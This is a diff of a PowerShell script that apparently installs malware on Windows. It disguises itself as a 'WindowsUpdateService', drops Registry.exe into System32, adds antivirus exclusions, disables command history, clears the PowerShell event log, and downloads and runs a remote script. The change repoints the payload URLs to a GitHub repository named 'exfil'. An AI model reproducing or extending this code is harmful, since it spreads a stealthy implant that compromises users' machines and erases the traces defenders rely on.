@@ -10,7 +10,7 @@ $regPath = "HKLM:\Software\WindowsUpdateService"
 $username= ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
 $exepath = "C:/Windows/System32/Registry.exe"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
-$messageboturl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/Registry.exe"
+$messageboturl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/Registry.exe"
 
 #Exclusion additon.
 try {
@@ -49,7 +49,7 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$url = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/ActiveAccessControl.ps1"
+$url = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/ActiveAccessControl.ps1"
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
 if ($response.StatusCode -eq 200) {
 $scriptContent = $response.Content
